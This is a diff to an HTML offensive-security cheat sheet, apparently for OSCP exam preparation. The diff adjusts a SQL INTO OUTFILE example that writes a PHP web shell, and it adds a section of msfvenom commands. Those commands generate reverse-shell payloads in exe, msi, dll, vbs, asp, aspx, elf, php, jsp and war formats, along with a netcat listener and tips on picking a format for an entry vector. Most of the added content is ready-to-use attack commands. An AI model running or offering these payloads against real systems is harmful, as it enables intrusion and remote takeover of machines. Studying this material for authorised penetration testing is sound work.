@@ -323,7 +323,7 @@ INTO OUTFILE '/var/www/html/shell.php';
                 <h3>Windows alternative web shell path</h3>
 
                 <pre><code>
-SELECT '<?php system($_GET["cmd"]); ?>'
+SELECT '&lt;?php system($_GET["cmd"]); ?&gt;'
 INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
         </code></pre>
 
@@ -460,6 +460,179 @@ whoami
 
             </div>
         </div>
+
+<div class="section">
+    <div class="section-header">MSFVenom → Payloads Multi-OS (Windows / Linux / Formats / OSCP Cheatsheet)</div>
+
+    <div class="section-content">
+
+        <h3>What is MSFVenom (mental model)</h3>
+
+        <p>
+            MSFVenom is a payload generator that creates executable payloads for different operating systems and formats.
+            In OSCP, the goal is not “Metasploit usage”, but generating a binary/script that executes a reverse shell.
+        </p>
+
+        <h3>Windows Reverse Shells</h3>
+
+        <h4>Windows 64-bit (recommended)</h4>
+
+        <pre><code>
+# Stable modern Windows payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o shell64.exe
+        </code></pre>
+
+        <p>
+            ✔ Use on modern Windows (Server 2016/2019/10/11)  
+            ✔ Avoids WOW64 issues  
+            ✔ Most reliable option
+        </p>
+
+        <h4>Windows 32-bit (legacy systems)</h4>
+
+        <pre><code>
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o shell32.exe
+        </code></pre>
+
+        <p>
+            ✔ Use only when target is old (XP / 7 / legacy apps)  
+            ✔ Not needed for modern OSCP boxes most of the time
+        </p>
+
+        <h4>Windows MSI (AlwaysInstallElevated / installer abuse)</h4>
+
+        <pre><code>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi -o install.msi
+        </code></pre>
+
+        <p>
+            ✔ Used when you can execute installers  
+            ✔ Common in privilege escalation (SYSTEM via MSI execution)
+        </p>
+
+        <h4>Windows DLL (process injection / hijacking)</h4>
+
+        <pre><code>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f dll -o payload.dll
+        </code></pre>
+
+        <p>
+            ✔ Used for DLL hijacking scenarios  
+            ✔ Often dropped into writable service folders
+        </p>
+
+        <h4>Windows Script Payloads</h4>
+
+        <pre><code>
+# VBS (legacy environments)
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f vbs -o shell.vbs
+
+# ASP (IIS web servers)
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp -o shell.asp
+
+# ASPX (modern IIS)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f aspx -o shell.aspx
+        </code></pre>
+
+        <p>
+            ✔ Use when exploiting web uploads (IIS / legacy apps / file upload bugs)
+        </p>
+
+        <h3>Linux Reverse Shells</h3>
+
+        <h4>Linux 64-bit (most common)</h4>
+
+        <pre><code>
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o shell.elf
+        </code></pre>
+
+        <p>
+            ✔ Default Linux payload  
+            ✔ Works on most modern distros
+        </p>
+
+        <h4>Linux 32-bit</h4>
+
+        <pre><code>
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -o shell32.elf
+        </code></pre>
+
+        <p>
+            ✔ Rare, but useful for old binaries or constrained environments
+        </p>
+
+        <h3>Web Payloads (very common in OSCP)</h3>
+
+        <h4>PHP reverse shell</h4>
+
+        <pre><code>
+msfvenom -p php/reverse_php LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw -o shell.php
+        </code></pre>
+
+        <h4>JSP (Java web servers)</h4>
+
+        <pre><code>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw -o shell.jsp
+        </code></pre>
+
+        <h4>WAR file (Tomcat deployment)</h4>
+
+        <pre><code>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war -o shell.war
+        </code></pre>
+
+        <p>
+            ✔ Upload to Tomcat → deploy → execute shell
+        </p>
+
+        <h3>Listener (always required)</h3>
+
+        <pre><code>
+nc -lvnp &lt;PORT&gt;
+        </code></pre>
+
+        <p>
+            ✔ Must match LPORT  
+            ✔ Must be reachable from victim machine
+        </p>
+
+        <h3>Format Selection Guide (VERY IMPORTANT)</h3>
+
+        <pre><code>
+Windows executable exploit → .exe  
+Privilege escalation via installer → .msi  
+Web upload (IIS) → .aspx / .asp / .vbs  
+Linux exploit → .elf  
+Web server (PHP) → .php  
+Java apps → .jsp / .war  
+        </code></pre>
+
+        <h3>Architecture decision (critical OSCP rule)</h3>
+
+        <pre><code>
+Modern Windows → x64 payload  
+Legacy systems → x86 payload  
+Unknown system → try x64 first
+        </code></pre>
+
+        <h3>Common mistakes</h3>
+
+        <pre><code>
+- Wrong architecture (x86 vs x64)
+- Wrong format for web server
+- LHOST not reachable (VPN / NAT issue)
+- Forgetting listener before execution
+        </code></pre>
+
+        <h3>OSCP mindset</h3>
+
+        <pre><code>
+Payload is just a delivery method:
+The real skill is choosing the correct format based on the entry vector.
+        </code></pre>
+
+    </div>
+</div>
 
         <div class="section">
 
